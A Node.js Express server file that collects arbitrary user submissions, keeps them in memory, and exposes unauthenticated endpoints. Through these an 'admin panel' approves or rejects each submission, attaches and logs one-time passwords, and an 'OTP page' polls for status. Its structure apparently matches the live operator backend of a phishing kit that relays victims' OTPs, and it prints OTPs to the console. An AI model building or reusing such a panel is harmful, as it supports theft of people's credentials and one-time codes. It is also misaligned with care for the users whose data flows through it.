// 1. Import the necessary packages
const express = require("express");
const cors = require("cors");
const path = require("path");
const crypto = require("crypto");
const fs = require("fs");

// 2. Create the server application
const app = express();
const PORT = process.env.PORT || 3000;
app.set('trust proxy', 1);

// 3. Apply general middleware
app.use(cors());
app.use(express.json());

// 4. Serve all static files like CSS, images, and other HTML files FIRST.
// This is the main part of the fix.
app.use(express.static(path.join(__dirname)));

// --- FINGERPRINT SYSTEM FOR THE MAIN PAGE ---
// This middleware will now only run for the main entry page.
app.get("/", (req, res) => {
    const fingerprint = crypto.randomBytes(8).toString('hex');
    const filePath = path.join(__dirname, "index.html");

    fs.readFile(filePath, 'utf8', (err, data) => {
        if (err) {
            console.error("Error reading index.html:", err);
            // If index.html doesn't exist, send a clear error.
            return res.status(404).send("index.html not found.");
        }
        // Replace a placeholder in your HTML with the real fingerprint
        const modifiedHtml = data.replace('%%FINGERPRINT%%', fingerprint);
        res.send(modifiedHtml);
    });
});

// --- END OF FINGERPRINT SYSTEM ---

// 5. Create an "in-memory" database that holds a LIST of submissions
let submissions = [];

// 6. Endpoint for receiving user data
app.post("/submit", (req, res) => {
    console.log("Received a new submission!");
    const newSubmission = req.body;
    newSubmission.id = Date.now().toString();
    newSubmission.status = "pending";
    newSubmission.timestamp = new Date().toLocaleString("en-US", { timeZone: "Asia/Kolkata" });
    submissions.push(newSubmission);
    res.status(200).json({
        message: "Submission received.",
        submissionId: newSubmission.id,
    });
});

// 7. Endpoint for the admin panel to get ALL PENDING submissions
app.get("/submission", (req, res) => {
    const pendingSubmissions = submissions.filter(
        (s) => s.status === "pending",
    );
    res.status(200).json(pendingSubmissions);
});

// 8. Endpoint for updating the status (from admin) OR adding/clearing the OTP
app.post("/update-status", (req, res) => {
    const { id, status, otp } = req.body;
    const submission = submissions.find((s) => s.id === id);

    if (submission) {
        if (status) {
            submission.status = status;
            console.log(`Submission ${id} status updated to: ${status}`);
        }
        if (otp) {
            submission.otp = otp;
            console.log(`Submission ${id} received OTP: ${otp}`);
        } else if (otp === null) {
            submission.otp = null;
            console.log(`Submission ${id} OTP cleared.`);
        }
        res.status(200).json({ message: `Submission ${id} updated.` });
    } else {
        res.status(404).json({ message: "Submission not found." });
    }
});

// 9. Endpoint for the OTP page to CHECK the status of a SPECIFIC submission
app.get("/get-status/:id", (req, res) => {
    const { id } = req.params;
    const submission = submissions.find((s) => s.id === id);
    if (submission) {
        res.status(200).json({ status: submission.status });
    } else {
        res.status(404).json({ message: "Submission not found." });
    }
});

// 10. Endpoint for the admin to get the ARCHIVE
app.get("/archive", (req, res) => {
    const archivedSubmissions = submissions
        .filter((s) => s.status !== "pending")
        .reverse();
    res.status(200).json(archivedSubmissions);
});

// 11. Start the server
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
